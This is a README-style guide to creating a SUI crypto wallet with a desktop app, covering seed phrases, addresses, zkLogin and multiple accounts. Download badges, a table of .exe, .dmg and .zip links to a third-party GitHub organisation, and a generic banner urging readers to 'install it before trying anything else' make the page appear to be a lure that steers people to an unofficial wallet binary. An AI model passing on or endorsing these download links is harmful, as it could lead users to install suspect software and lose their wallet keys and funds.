![SUI Wallet](assets/banner-article.png)

# Creating a new SUI Wallet

A new account is a new phrase; there is no sign-up and no password to reset.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Creating a wallet takes one decision and one piece of paper. The app generates a 24-word phrase on your
machine, shows it once, asks you to confirm it, and then the account exists. No email, no phone number and
no account with a server - and the words, not the app, are what makes the account yours.

## What creation asks for

Open the app and the welcome screen offers two paths. Creation is the one that starts from nothing: the app generates the secret, derives an address from it, and shows the phrase that encodes it, all on this machine before any network call is needed.

That is the whole input. There is no registration step and no form to fill in before the wallet works. A flow that asks for an email address before it shows you an account is not this
one, and a flow that asks for the phrase it just generated is not a flow at all.

## The phrase step

The 24 words appear once, on screen, generated locally. Copy them in order, by hand, before you touch anything else, and then complete the confirmation step the app puts in front of you - that step is what proves the copy is legible, not just the reading.

[SUI Wallet seed phrase setup](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/sui-wallet-seed-phrase-setup.md) covers that screen in detail: why the confirmation exists, where
the words should and should not be written, and what to do if the form rejects a phrase you are sure about.
It is worth reading before you create rather than after.

## The first address and what it is

The address is derived from the words. That is the fact that governs everything else: the same 24 words
produce the same address on any machine, in any release, so the address is not stored anywhere and cannot
be lost separately from the phrase.

It is also public. An address can be shared, printed on a page, or sent to anyone who wants to pay you,
because it cannot be used to take funds. [Receiving SUI into your wallet](https://github.com/sui-blockchain-wallet/onchain-transfer-guides/blob/main/receiving-sui-into-your-wallet.md) covers how to hand it
over and what a sender needs from you.

If a transfer arrives next, expect the balance to appear when the network includes it rather than at the
moment the sender sends it. A new wallet that looks empty for a moment is not a failed transfer, and
checking the address before concluding anything is the faster path than asking the sender to resend.

## Signing in later

The app opens on the account it holds. An email-and-password login would imply a server holding something on your behalf; here the keys are generated and stored on the machine itself, so there is nothing remote to authenticate against, and no password to reset.

Two paths exist besides a phrase account. Signing in with a provider creates a zkLogin account, whose
address is derived from the provider identity, the application id and a salt - no phrase, and no exportable
key. And restoring an existing account from its 24 words is the way back in if the app is installed fresh
on a new machine.

That distinction decides what you keep. A phrase account is backed up on paper; a provider account is
reached through the provider instead, which is a different arrangement with a different risk attached to
it.

## A second account later

One phrase can hold several accounts, each with its own address, and the app switches between them. That is useful for separating purposes - one account for holding, one for connecting to applications - without managing a second phrase to keep track of.

What it does not do is separate risk: every account derived from the same words is exposed by the same
words. If the point of the second account is to limit what a compromised site can reach, it needs its own
phrase.

## What creation never asks for

No email, no phone number, no identity document, no payment, and no seed phrase from anyone at all. The app has no server-side account to create, so there is nothing to verify and nobody to confirm it to before you can use it.

Install from the project's [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest)
rather than from anywhere else, and the flow you see will be the one described here.
[What is SUI Wallet for desktop?](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/what-is-sui-wallet-desktop.md) explains what the product is before you commit to it.

## FAQ

### How do I create a SUI wallet?

Install the current release, open it, choose Create on the welcome screen, write the 24 words down in
order, confirm them, and the account exists with an address you can receive at.

### How do I generate a SUI wallet without installing anything?

You cannot. The phrase is generated locally by the application, and generation on someone else's server
would mean someone else had the words first.

### How do I log in to SUI Wallet?

By opening it. There is no remote login: the app opens on the account it holds. If you are on a new
machine, restore from the 24 words instead.

### Can I have more than one wallet?

Yes. One phrase can hold several accounts, and a second phrase creates accounts that are independent of
the first - including when one of them is compromised.

### Is there a password to set?

This guide does not describe one, because the account is the phrase and the phrase is what you keep. What
matters is that the words exist on paper before the account holds anything.

### What happens if I close the app during creation?

If the phrase was shown and not written down, treat it as lost and create again - but check first whether
the account appears in the app. Creating a second account from a phrase you did not record gives you an
address you cannot restore later.
